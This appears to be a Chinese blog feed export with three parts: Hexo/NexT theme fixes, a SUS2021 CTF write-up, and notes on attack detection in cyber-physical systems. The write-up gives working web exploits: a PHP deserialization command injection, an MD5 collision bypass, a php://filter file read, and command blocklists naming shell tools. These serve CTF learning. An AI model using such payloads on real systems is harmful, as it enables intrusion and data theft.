<h3 id="编译时遇到未知路径问题"><a href="#编译时遇到未知路径问题" class="headerlink" title="编译时遇到未知路径问题"></a>编译时遇到未知路径问题</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">FATAL &#123;</span><br><span class="line">  err: Template render error: (unknown path)</span><br><span class="line">    Error: unexpected end of comment</span><br><span class="line">      at Object._prettifyError (D:\Document\Blog\node_modules\nunjucks\src\lib.js:36:11)</span><br><span class="line">      at Template.render (D:\Document\Blog\node_modules\nunjucks\src\environment.js:538:21)</span><br><span class="line">      at Environment.renderString (D:\Document\Blog\node_modules\nunjucks\src\environment.js:380:17)</span><br><span class="line">      at D:\Document\Blog\node_modules\hexo\lib\extend\tag.js:236:16</span><br><span class="line">      at tryCatcher (D:\Document\Blog\node_modules\bluebird\js\release\util.js:16:23)</span><br><span class="line">      at Function.Promise.fromNode.Promise.fromCallback (D:\Document\Blog\node_modules\bluebird\js\release\promise.js:209:30)</span><br></pre></td></tr></table></figure>

<p>这种是文章中出现未转义的括号造成的，尽量用 ` 进行转移，将其包裹成文本或代码形式</p>
<h3 id="页面下方翻页不正常显示"><a href="#页面下方翻页不正常显示" class="headerlink" title="页面下方翻页不正常显示"></a>页面下方翻页不正常显示</h3><p><a href="https://www.cnblogs.com/xiejava/p/12456273.html">参考</a></p>
<p><code>&lt;i class=&quot;fa fa-angle-right&quot;&gt;&lt;/i&gt;</code>不显示为<code>&gt;</code>，解决方法是在<code>Blog\themes\next\layout\_partials\pagination.swig</code>文件中，添加参数<code>escape: false</code></p>
<p><img src="/2021/05/09/Ref/image-20210524231854084.png" alt="image-20210524231854084"></p>
<p>然后重新编译即可正常显示了，如下图</p>
<p><img src="/2021/05/09/Ref/image-20210524231934515.png" alt="image-20210524231934515"></p>
<h2 id="不同的修改"><a href="#不同的修改" class="headerlink" title="不同的修改"></a>不同的修改</h2><p>版本：从参考地址下载的最新版（NexT 8.4.0 Released）</p>
<h3 id="圆形旋转头像"><a href="#圆形旋转头像" class="headerlink" title="圆形旋转头像"></a>圆形旋转头像</h3><p>打开<code>Blog\themes\hexo-theme-next-8.4.0\_config.yml</code>文件，将<code>rounded</code>和<code>rotated</code>都改成<code>true</code>即可</p>
<p><img src="/2021/05/09/Ref/image-20210510101136415.png" alt="image-20210510101136415"></p>
<h3 id="添加动态背景"><a href="#添加动态背景" class="headerlink" title="添加动态背景"></a>添加动态背景</h3><p><code>Blog\themes\hexo-theme-next-8.4.0\_config.yml</code>文件，定位<code>canvas</code>然后<code>enable=true</code>即可</p>
<h3 id="删除强力驱动"><a href="#删除强力驱动" class="headerlink" title="删除强力驱动"></a>删除强力驱动</h3><p>在<code>\Blog\themes\hexo-theme-next-8.4.0\layout\_partials\footer.njk</code>定位<code>powered</code>，将以下代码注释掉（<!-- -->）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;%- if theme.footer.powered %&#125;</span><br><span class="line">  &lt;div class=&quot;powered-by&quot;&gt;</span><br><span class="line">    &#123;%- set next_site = &#x27;https://theme-next.js.org&#x27; if theme.scheme === &#x27;Gemini&#x27; else &#x27;https://theme-next.js.org/&#x27; + theme.scheme | lower + &#x27;/&#x27; %&#125;</span><br><span class="line">    &#123;&#123;- __(&#x27;footer.powered&#x27;, next_url(&#x27;https://hexo.io&#x27;, &#x27;Hexo&#x27;, &#123;class: &#x27;theme-link&#x27;&#125;) + &#x27; &amp; &#x27; + next_url(next_site, &#x27;NexT.&#x27; + theme.scheme, &#123;class: &#x27;theme-link&#x27;&#125;)) &#125;&#125;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">&#123;%- endif %&#125;</span><br></pre></td></tr></table></figure>



<h3 id="修改文章底部带-号的标签"><a href="#修改文章底部带-号的标签" class="headerlink" title="修改文章底部带#号的标签"></a>修改文章底部带#号的标签</h3><p>打开<code>myblog/themes/next/layout/_macro/post.swig</code>文件，搜索<code>post.tags</code>，将 <code>if theme.tag_icon else &#39;#&#39;</code>删除即可</p>
<p><img src="/2021/05/09/Ref/image-20210510095812090.png" alt="image-20210510095812090"></p>
<p>效果：</p>
<p><img src="/2021/05/09/Ref/image-20210510095930542.png" alt="image-20210510095930542"></p>
]]></content>
      <categories>
        <category>Tools</category>
      </categories>
      <tags>
        <tag>Ref</tag>
        <tag>Blog</tag>
      </tags>
  </entry>
  <entry>
    <title>SUS2021-WP</title>
    <url>/2021/03/20/SUS2021-WP/</url>
    <content><![CDATA[<p>分数：3319<br>排名：2</p>
<h2 id="Web-easycmd"><a href="#Web-easycmd" class="headerlink" title="[Web] easycmd"></a>[Web] easycmd</h2><h3 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">error_reporting(<span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>])) &#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$flag</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$cmd</span>=<span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$verify</span>=<span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;verify === <span class="string">&quot;get flag&quot;</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (preg_match(<span class="string">&#x27;/(cat|\;|\&gt;|more|less|head|tail|tac|nl|grep|strings|\||\&amp;)/i&#x27;</span>, <span class="keyword">$this</span>-&gt;cmd)) &#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&quot;No way&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            @system(<span class="string">&quot;echo <span class="subst">&#123;$this-&gt;cmd&#125;</span>&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;verify failed&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = unserialize(<span class="variable">$flag</span>);</span><br></pre></td></tr></table></figure>

<ol>
<li>需要序列化verify和cmd  </li>
<li>这里需要注意，cmd的指令是经过echo的，所以需要<code>$()</code>在括号中加入待执行的指令，这里先看看根目录<code>ls /</code>  </li>
</ol>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$verify</span>  = <span class="string">&quot;get flag&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$cmd</span> = <span class="string">&quot;$(ls /)&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> Flag(); </span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize(<span class="variable">$a</span>)); </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<ol start="3">
<li><p>拿到<a href="http://www.dooccn.com/php/">PHP在线</a>跑一下，得到</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">O%3A4%3A%22Flag%22%3A2%3A%7Bs%3A12%3A%22%00Flag%00verify%22%3Bs%3A8%3A%22get+flag%22%3Bs%3A9%3A%22%00Flag%00cmd%22%3Bs%3A7%3A%22%24%28ls+%2F%29%22%3B%7D  </span><br></pre></td></tr></table></figure></li>
<li><p>访问<a href="http://susctf.com:10001/index.php?flag=O:4:%22Flag%22:2:%7Bs:12:%22%00Flag%00verify%22;s:8:%22get+flag%22;s:9:%22%00Flag%00cmd%22;s:7:%22$(ls+/)%22;%7D">http://susctf.com:10001/index.php?flag=O%3A4%3A%22Flag%22%3A2%3A%7Bs%3A12%3A%22%00Flag%00verify%22%3Bs%3A8%3A%22get+flag%22%3Bs%3A9%3A%22%00Flag%00cmd%22%3Bs%3A7%3A%22%24%28ls+%2F%29%22%3B%7D</a><br><img src="/2021/03/20/SUS2021-WP/0_ezcmd.png">  </p>
</li>
<li><p>接下来获取flag，因为cat，more等等都被过滤了，所以<code>uniq /flag</code>序列化结果为</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">O%3A4%3A%22Flag%22%3A2%3A%7Bs%3A12%3A%22%00Flag%00verify%22%3Bs%3A8%3A%22get+flag%22%3Bs%3A9%3A%22%00Flag%00cmd%22%3Bs%3A13%3A%22%24%28uniq+%2Fflag%29%22%3B%7D  </span><br></pre></td></tr></table></figure></li>
<li><p>得到flag<br><img src="/2021/03/20/SUS2021-WP/01_flag.png"></p>
</li>
</ol>
<h2 id="Web-happy-web"><a href="#Web-happy-web" class="headerlink" title="[Web] happy_web"></a>[Web] happy_web</h2><h3 id="解题思路-1"><a href="#解题思路-1" class="headerlink" title="解题思路"></a>解题思路</h3><ol>
<li><a href="http://susctf.com:10001/index.php?img=61476c6861476c684c6d70775a773d3d&amp;cmd=">http://susctf.com:10001/index.php?img=61476c6861476c684c6d70775a773d3d&amp;cmd=</a>  </li>
<li>img那段好像16进制ASCII，对应为aGlhaGlhLmpwZw==，base64解码结果为hiahia.jpg  </li>
<li>可以用img读取页面源码，所以先将<code>index.php</code>base64编码再转成16进制得到6157356b5a58677563476877  </li>
<li><code>/index.php?img=6157356b5a58677563476877&amp;cmd=</code>用Bp看下响应<br><img src="/2021/03/20/SUS2021-WP/02_Bp.png">  </li>
<li>将得到的base64解码，得到  </li>
</ol>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(E_ALL || ~ E_NOTICE);</span><br><span class="line">header(<span class="string">&#x27;content-type:text/html;charset=utf-8&#x27;</span>);</span><br><span class="line"><span class="variable">$cmd</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;img&#x27;</span>]) || !<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]))</span><br><span class="line">    header(<span class="string">&#x27;Refresh:0;url=./index.php?img=61476c6861476c684c6d70775a773d3d&amp;cmd=&#x27;</span>);</span><br><span class="line"><span class="variable">$file</span> = base64_decode(hex2bin(<span class="variable">$_GET</span>[<span class="string">&#x27;img&#x27;</span>]));</span><br><span class="line"></span><br><span class="line"><span class="variable">$file</span> = preg_replace(<span class="string">&quot;/[^a-zA-Z0-9.]+/&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">&quot;/flag/i&quot;</span>, <span class="variable">$file</span>)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;img src =&quot;./jz.jpg&quot;&gt;&#x27;</span>;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;lmy shi wo da ge&quot;</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$txt</span> = base64_encode(file_get_contents(<span class="variable">$file</span>));</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;img src=&#x27;data:image/gif;base64,&quot;</span> . <span class="variable">$txt</span> . <span class="string">&quot;&#x27;&gt;&lt;/img&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$cmd</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">&quot;/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\&#x27;|\&quot;|\`|;|,|\*|\?|\\|\\\\|\n|\t|\r|\xA0|\&#123;|\&#125;|\(|\)|\&amp;[^\d]|@|\||\\$|\[|\]|&#123;|&#125;|\(|\)|-|&lt;|&gt;/i&quot;</span>, <span class="variable">$cmd</span>)) &#123;</span><br><span class="line">    <span class="keyword">echo</span>(<span class="string">&quot;bie xiang le&quot;</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> ((<span class="keyword">string</span>)<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>] !== (<span class="keyword">string</span>)<span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>] &amp;&amp; md5(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]) === md5(<span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>])) &#123;</span><br><span class="line">        <span class="keyword">echo</span> `<span class="variable">$cmd</span>`;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> (<span class="string">&quot;md5 is coooool&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;style&gt;</span><br><span class="line"></span><br><span class="line">&lt;/style&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<ol start="6">
<li><a href="https://blog.csdn.net/EC_Carrot/article/details/109525162">MD5强绕过</a>  </li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">a=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2</span><br><span class="line">&amp;b=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2</span><br></pre></td></tr></table></figure>

<ol start="7">
<li>同时cmd还过滤了一些字符，用dir看下<br><img src="/2021/03/20/SUS2021-WP/03_dir.png">  </li>
<li><code>dir /</code>空格用%20代替<br><img src="/2021/03/20/SUS2021-WP/04_flag.png">  </li>
<li><code>uniq%20/flag</code><br><img src="/2021/03/20/SUS2021-WP/05_flag.png"><br>SUSCTF{4c4f7d5fa95982aa2a3cec94905f1d66}</li>
</ol>
<h2 id="Web-LMY-de-miji"><a href="#Web-LMY-de-miji" class="headerlink" title="[Web] LMY_de_miji"></a>[Web] LMY_de_miji</h2><h3 id="解题思路-2"><a href="#解题思路-2" class="headerlink" title="解题思路"></a>解题思路</h3><ol>
<li><p>robots.txt提示Ss3cret.php  </p>
</li>
<li><p>查看<br><img src="/2021/03/20/SUS2021-WP/08_Ss3creta.png">  </p>
</li>
<li><p>因为过滤了input，data等等，所以用filter协议试试。<br><code>/Ss3cret.php?file=php://filter/read=convert.base64-encode/resource=f1f1fffl4g.php</code>  </p>
</li>
<li><p>另外，还要POST参数a和b，要求a与b不相等但它们的md5相等，这里md5比较是==可以用数组绕过，即<code>a[]=1&amp;b[]=2</code><br><img src="/2021/03/20/SUS2021-WP/09_filter.png">  </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PCFET0NUWVBFIGh0bWw+DQoNCjxodG1sPg0KDQo8aGVhZD4NCiAgICA8bWV0YSBjaGFyc2V0PSJ1dGYtOCI+DQogICAgPHRpdGxlPkZMQUc8L3RpdGxlPg0KPC9oZWFkPg0KDQo8Ym9keSBzdHlsZT0iYmFja2dyb3VuZC1jb2xvcjp3aGl0ZTsiPjxicj48YnI+PGJyPjxicj48YnI+PGJyPg0KDQo8aDEgc3R5bGU9ImZvbnQtZmFtaWx5OnZlcmRhbmE7Y29sb3I6cmVkO3RleHQtYWxpZ246Y2VudGVyOyI+eW91IHdhbnQgZmxhZz9pdCdzIGluIGhlcmUsY2FuIHlvdSBmaW5kIGl0ID9+fn48L2gxPjxicj48YnI+PGJyPg0KPHAgc3R5bGU9ImZvbnQtZmFtaWx5OmFyaWFsO2NvbG9yOnJlZDtmb250LXNpemU6MjBweDt0ZXh0LWFsaWduOmNlbnRlcjsiPg0KICAgIDw/cGhwDQogICAgJGZsYWcgPSAiZmxhZyBpbiBmZmZmZmZmZmZsNDQ0NGciOw0KICAgID8+DQo8L3A+DQo8L2JvZHk+DQoNCjwvaHRtbD4NCg==</span><br></pre></td></tr></table></figure></li>
<li><p>base64解码得到  </p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line"></span><br><span class="line">&lt;html&gt;</span><br><span class="line"></span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">&quot;utf-8&quot;</span>&gt;</span><br><span class="line">    &lt;title&gt;FLAG&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body style=<span class="string">&quot;background-color:white;&quot;</span>&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;</span><br><span class="line"></span><br><span class="line">&lt;h1 style=<span class="string">&quot;font-family:verdana;color:red;text-align:center;&quot;</span>&gt;you want flag?it<span class="string">&#x27;s in here,can you find it ?~~~&lt;/h1&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;</span></span><br><span class="line"><span class="string">&lt;p style=&quot;font-family:arial;color:red;font-size:20px;text-align:center;&quot;&gt;</span></span><br><span class="line"><span class="string">    &lt;?php</span></span><br><span class="line"><span class="string">    $flag = &quot;flag in fffffffffl4444g&quot;;</span></span><br><span class="line"><span class="string">    ?&gt;</span></span><br><span class="line"><span class="string">&lt;/p&gt;</span></span><br><span class="line"><span class="string">&lt;/body&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&lt;/html&gt;</span></span><br></pre></td></tr></table></figure></li>
<li><p>访问<code>http://susctf.com:10005/fffffffffl4444g</code><br><img src="/2021/03/20/SUS2021-WP/10_ffffffffff.png"></p>
</li>
</ol>
<h2 id="MISC-两只老虎爱跳舞"><a href="#MISC-两只老虎爱跳舞" class="headerlink" title="[MISC] 两只老虎爱跳舞"></a>[MISC] 两只老虎爱跳舞</h2><h3 id="解题思路-3"><a href="#解题思路-3" class="headerlink" title="解题思路"></a>解题思路</h3><ol>
<li>1234解压zip  </li>
<li><code>dd if=8695.tar.gz | openssl des3 -d -pbkdf2 -k 8695 | tar zxf -</code>解压tar.gz得到7303.tar.gz  </li>
<li><code>dd if=7303.tar.gz | openssl des3 -d -pbkdf2 -k 7303 | tar zxf -</code>得到1106.zip  </li>
<li>我直接裂开，不断套娃  </li>
<li>解压脚本如下(我写得好像有点啰嗦。。。)  </li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getFile</span>(<span class="params">path</span>):</span></span><br><span class="line">    fileName = []</span><br><span class="line">    lst = os.listdir(path)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> lst:</span><br><span class="line">        <span class="built_in">print</span>(i+<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">        suffix = os.path.splitext(i)[<span class="number">1</span>]</span><br><span class="line">        key = i[<span class="number">0</span>:<span class="number">4</span>]</span><br><span class="line">        delRawFileCmd = <span class="string">&quot;rm &quot;</span> + path + <span class="string">&quot;/&quot;</span> + i</span><br><span class="line">        <span class="keyword">if</span> suffix == <span class="string">&quot;.zip&quot;</span>:</span><br><span class="line">            cmd = <span class="string">&quot;unzip -P &quot;</span> + key + <span class="string">&quot; &quot;</span> + path + <span class="string">&quot;/&quot;</span> + i</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                subprocess.check_output(cmd, shell=<span class="literal">True</span>)</span><br><span class="line">                subprocess.check_output(delRawFileCmd, shell=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">except</span> subprocess.CalledProcessError <span class="keyword">as</span> e:</span><br><span class="line">                subprocess.check_output(delRawFileCmd, shell=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">elif</span> suffix == <span class="string">&quot;.gz&quot;</span>:</span><br><span class="line">            cmd = <span class="string">&quot;dd if=&quot;</span> + path + <span class="string">&quot;/&quot;</span> + i + <span class="string">&quot; | openssl des3 -d -pbkdf2 -k &quot;</span> + key + <span class="string">&quot;| tar zxf -&quot;</span></span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                subprocess.check_output(cmd, shell=<span class="literal">True</span>)</span><br><span class="line">                subprocess.check_output(delRawFileCmd, shell=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">except</span> subprocess.CalledProcessError <span class="keyword">as</span> e:</span><br><span class="line">                subprocess.check_output(delRawFileCmd, shell=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">elif</span> suffix == <span class="string">&quot;.py&quot;</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">// 开始存放<span class="number">1234.</span><span class="built_in">zip</span>压缩文件的目录</span><br><span class="line">path = <span class="string">&quot;/home/v/Desktop/yasuo&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="built_in">len</span>(os.listdir(path)):</span><br><span class="line">    getFile(path)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Ref https://blog.csdn.net/heda3/article/details/102535307</span></span><br></pre></td></tr></table></figure>

<ol start="6">
<li>最终得到mp3<br><img src="/2021/03/20/SUS2021-WP/06_mp3.png">  </li>
<li>mp3隐写<a href="https://cnpanda.net/ctf/342.html">参考</a><br>属性中<br><img src="/2021/03/20/SUS2021-WP/07_mf.png">  </li>
<li>用010Editor打开该音频文件，注意需要安装MP3.bt模板，结合private（MP3数据帧中的保留位）和mf[n]，猜测保留位private中隐写了数据。<br><img src="/2021/03/20/SUS2021-WP/11_private&padding.png">  </li>
<li>其中，89166是MPEG帧的起始地址，可以看到结构体中89166开始的12+1+2+1+4+2+1+1=16+8位达到private位，也就说第89168字节的最后一位正好是private的数值，倒数第二位为padding。这里还要关注padding的原因是：发现每个MPEG帧长不一定相同，会受到padding的影响，padding为0帧长就是1044，否则就是1045  </li>
<li>另外，循环的跳出条件是，遍历完所有MPEG帧，也就是一直到1275124<br><img src="/2021/03/20/SUS2021-WP/12_MPEG%E5%B8%A7.png">  </li>
<li>提取代码如下：  </li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> bytes_to_long</span><br><span class="line"></span><br><span class="line">n = <span class="number">89168</span></span><br><span class="line">result = <span class="string">&#x27;&#x27;</span></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line">file = <span class="built_in">open</span>(<span class="string">&#x27;D:\\Document\\CTF\\SUS2021\\Misc\\两只老虎爱跳舞\\小兔子乖乖拔萝卜\\Do_you_know_private.mp3&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>)</span><br><span class="line"><span class="keyword">while</span> n &lt; <span class="number">1275124</span>:</span><br><span class="line">    file.seek(n, <span class="number">0</span>)</span><br><span class="line">    private_related_byte = file.read(<span class="number">1</span>)</span><br><span class="line">    <span class="built_in">print</span>(private_related_byte)</span><br><span class="line">    private_val = <span class="built_in">bin</span>(bytes_to_long(private_related_byte))[-<span class="number">1</span>]</span><br><span class="line">    result = result + private_val</span><br><span class="line">    padding_val = <span class="built_in">bin</span>(bytes_to_long(private_related_byte))[-<span class="number">2</span>]</span><br><span class="line">    <span class="keyword">if</span> padding_val == <span class="string">&#x27;1&#x27;</span> <span class="keyword">or</span> padding_val == <span class="string">&#x27;0&#x27;</span>:</span><br><span class="line">        n = n + <span class="number">1044</span> + <span class="built_in">int</span>(padding_val, <span class="number">2</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">bin_lst = re.findall(<span class="string">&#x27;.&#123;&#x27;</span>+<span class="built_in">str</span>(<span class="number">8</span>)+<span class="string">&#x27;&#125;&#x27;</span>, result)</span><br><span class="line"><span class="built_in">print</span>(bin_lst)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> bin_lst:</span><br><span class="line">    flag += <span class="built_in">chr</span>(<span class="built_in">int</span>(i, <span class="number">2</span>))</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>

<ol start="12">
<li>打印U1VTQ1RGJTdCRDBfeTB1X2wxazNfZDRuYzFuZyU3RA==  </li>
<li>base64解码SUSCTF%7BD0_y0u_l1k3_d4nc1ng%7D  </li>
<li>将左右括号%7B和%7D改过来即可</li>
</ol>
<h2 id="MISC-Word"><a href="#MISC-Word" class="headerlink" title="[MISC] Word"></a>[MISC] Word</h2><h3 id="解题思路-4"><a href="#解题思路-4" class="headerlink" title="解题思路"></a>解题思路</h3><ol>
<li>word中提示了JPG_encryption，但是并没有发现隐藏图片<br><img src="/2021/03/20/SUS2021-WP/14_word.png">  </li>
<li>将后缀名改为zip再解压缩发现了一个guessguessguess.xml，用010Editor看到其文件头是jfif，将其改为jpg可以打开<br><img src="/2021/03/20/SUS2021-WP/15_gougou.png">  </li>
<li>jpg格式不能隐写，用stegdetect也没检测到什么结果，直到我查到一个工具叫<a href="https://github.com/crorvick/outguess.git">outguess</a>，这个文件名就在疯狂暗示  </li>
<li><code>outguess -k &quot;What_do_you_know_about_JPG_encryption&quot; -r guessguessguess.jpg hidden.txt</code>  </li>
<li>SUSCTF{Congr4tulat1on5_Y0u_gu3ssed_1t}</li>
</ol>
<h2 id="Crypto-ezXOR"><a href="#Crypto-ezXOR" class="headerlink" title="[Crypto] ezXOR"></a>[Crypto] ezXOR</h2><h3 id="解题思路-5"><a href="#解题思路-5" class="headerlink" title="解题思路"></a>解题思路</h3><p><code>xortool -c 20 enc.txt</code><br><img src="/2021/03/20/SUS2021-WP/13_xor.png"><br>SUSCTF{XOR_t00l_cAn_so1ve_1t}</p>
<h2 id="Re-0-year-old-re"><a href="#Re-0-year-old-re" class="headerlink" title="[Re] 0-year-old-re"></a>[Re] 0-year-old-re</h2><h3 id="解题思路-6"><a href="#解题思路-6" class="headerlink" title="解题思路"></a>解题思路</h3><ol>
<li>答案就在明面上D500B61B-9270-41CB-9EB4-FEDF3C5FC101<br><img src="/2021/03/20/SUS2021-WP/14_flag.png">  </li>
</ol>
<h2 id="Misc-签到到到到"><a href="#Misc-签到到到到" class="headerlink" title="[Misc] 签到到到到"></a>[Misc] 签到到到到</h2><h3 id="解题思路-7"><a href="#解题思路-7" class="headerlink" title="解题思路"></a>解题思路</h3><ol>
<li>先base58再base85，这里借助CyberChef_v8.31.1完成<br><img src="/2021/03/20/SUS2021-WP/16_misc.png">  </li>
<li>SUSCTF{Welc0m3_t0_th3_c0mpet1tion}</li>
</ol>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>WP</tag>
      </tags>
  </entry>
  <entry>
    <title>信息物理系统的攻击检测与安全状态估计 笔记</title>
    <url>/2021/05/10/%E4%BF%A1%E6%81%AF%E7%89%A9%E7%90%86%E7%B3%BB%E7%BB%9F%E7%9A%84%E6%94%BB%E5%87%BB%E6%A3%80%E6%B5%8B%E4%B8%8E%E5%AE%89%E5%85%A8%E7%8A%B6%E6%80%81%E4%BC%B0%E8%AE%A1/</url>
    <content><![CDATA[<h2 id="主要内容"><a href="#主要内容" class="headerlink" title="主要内容"></a>主要内容</h2><ul>
<li>有限时间异常检测器：负责在预设的有限时间内检测攻击（异常）</li>
<li>系统安全状态观测器：负责状态评估，并在检测到攻击时，调整系统以确保安全状态</li>
</ul>
<p>安全状态估计：是从一组有噪声或被破坏的测量值中估计动态系统状态</p>
<p>本文概要：提出一种<strong>有限时间检测器</strong>来检测<strong>执行器</strong>攻击下系统的状态，并设计<strong>观测器</strong>对系统状态进行<strong>安全估计</strong></p>
